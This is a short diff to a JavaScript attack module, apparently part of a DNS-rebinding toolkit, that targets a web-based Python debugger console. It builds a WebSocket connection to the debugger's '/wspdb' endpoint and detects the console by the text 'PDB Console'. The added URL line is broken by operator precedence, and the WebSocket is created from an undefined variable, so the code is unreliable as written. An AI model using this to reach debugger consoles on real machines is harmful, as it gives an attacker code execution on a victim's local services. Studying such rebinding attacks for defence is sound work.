@@ -9,7 +9,7 @@ const WebPdb = () => {
 
     // Invoked after DNS rebinding has been performed
     function attack(headers, cookie, body) {
-        let wsURL = "ws://" + location.hostname + ":" + loc.port +
+        let wsURL = "ws://" + location.hostname + ":" + location.port === 80 ? "80" : location.port +
             "/wspdb";
 
         const ws = new WebSocket(url);
@@ -33,8 +33,8 @@ const WebPdb = () => {
         if (body === null) {
             return detected;
         }
-        
-        if (body.includes('PDB Console' === true)) {
+
+        if (body.includes('PDB Console') === true) {
             detected = true;
         }
         return detected;
